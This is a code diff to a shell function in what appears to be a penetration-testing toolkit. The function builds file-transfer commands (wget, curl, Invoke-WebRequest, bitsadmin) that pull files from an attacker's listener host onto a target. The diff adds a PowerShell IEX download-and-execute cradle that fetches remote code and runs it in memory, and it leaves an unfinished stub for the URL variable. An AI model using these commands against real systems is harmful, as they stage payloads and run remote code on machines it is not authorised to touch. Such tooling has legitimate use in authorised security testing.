@@ -92,10 +92,14 @@ nb-srv-file-download() {
     echo "4.  wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
     echo "5.  curl http://${__LHOST}:${__LPORT}/$filename -O $filename"
     echo "6.  bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Temp\<FILE_NAME>"
-    echo "7.  Previous menu"
+    echo "7.  IEX(New-Object Net.WebClient).DownloadString('$ghrawurl')"
+    echo "8.  Previous menu"
     echo
     echo -n "Choice: "
     read choice
+
+    # if choice == 7 - ask for ghrawurl variable
+
 
     case $choice in
         1) __COMMAND="Invoke-WebRequest http://${__LHOST}:${__LPORT}/$filename -OutFile $filename";;
@@ -104,7 +108,8 @@ nb-srv-file-download() {
         4) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
         5) __COMMAND="curl http://${__LHOST}:${__LPORT}/$filename -O $filename";;
         6) __COMMAND="bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Temp\\$filename";;
-        7) exit;;
+        7) __COMMAND="IEX(New-Object Net.WebClient).DownloadString('$ghrawurl')";;
+        8) exit;;
         *) echo "Invalid option";;
     esac
 
